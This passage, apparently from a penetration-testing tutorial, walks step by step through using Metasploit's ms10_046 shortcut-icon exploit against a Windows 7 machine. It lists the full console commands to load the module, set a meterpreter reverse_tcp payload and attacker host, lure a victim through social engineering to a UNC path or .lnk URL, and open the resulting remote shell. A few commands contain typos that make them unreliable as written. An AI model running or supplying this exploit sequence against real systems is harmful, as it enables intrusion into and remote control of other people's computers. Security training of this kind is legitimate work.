Penetration Attempt
Metasploit is available on Windows and Linux. I prefer the Linux platform for its
flexibility. The main purpose of Metasploit is to launch attacks on vulnerable services, although
there are a plethora of tools contained within this suite. To give you an example of the
functionality NMAP natively tied into this suit as well as some webserver hosting tools.
Metasploit is the Swiss army knife when it comes to penetration testing. I will begin this section
by exploiting ms10_046. Again, the format of the exploit title is given out by Microsoft. The first
part is the year and the last part is the number incremented of each they have discovered.
Ms10_046 is a vulnerability in the handling of Windows shortcut files (.LINK) that can contain
an icon resource pointing to a malicious DLL. The Metasploit Module for this creates a
WebDAV service that can be used to run an arbitrary payload when accessed as an UNC path.
First we start Metasploit framework by typing the following command.

Msfconsole

This will start the suit and load up a modified shell. From there we type

use exploit/windows/browser/ms10_046_shortcut_icon_ddlloader

This loads the module for that particular exploit. From there you are now able to set options for
the payload and even the exploit. Some options may be required. To see the options type

show options

Now we will set the current payload

set payload windows/meterpreter/reverse_tcp

Meterpreter is where all the magic happened after the payload launches Meterpreter and gives us
a nice shell back to the Windows 7 box. Meterpreter uses DLL injection and communicates over
Ruby stager socket. It gives us command remote command line ability. We are going to set the
options to use the local host a hosting server for our malicious site.

set SRVHOST 192.168.1.15
set LHOST 192.168.1.15

Review your options after you are done. That’s it! Now we can exploit simple type exploit.
Now we social engineer our victim into either going to the following page

\\192.168.1.15\mhjs\.

Or we can get them to render the icon of this URL

http://192.168.1.15/<anything>.lnk

This will cause a cause a Meterpreter session to be opened giving you a shell to the box.

Meterpreter session 1 opened (192.168.1.15:4444 -> 192.168.1.13:53636)

To get to your session you type

Session –I -1

That is all for Metasploit basics. This example is especially significant to me because social
engineer pentesting combined with the direct attack methodologies of something like Metasploit
make this very potent. Most people fall victim to social engineering attacks. I will continue
where we left off on this in the section 6.1 and 6.2. The next section I am going to discuss how to
use SQLmap which is a tool that has a place in my heart for dumping databases like a champ.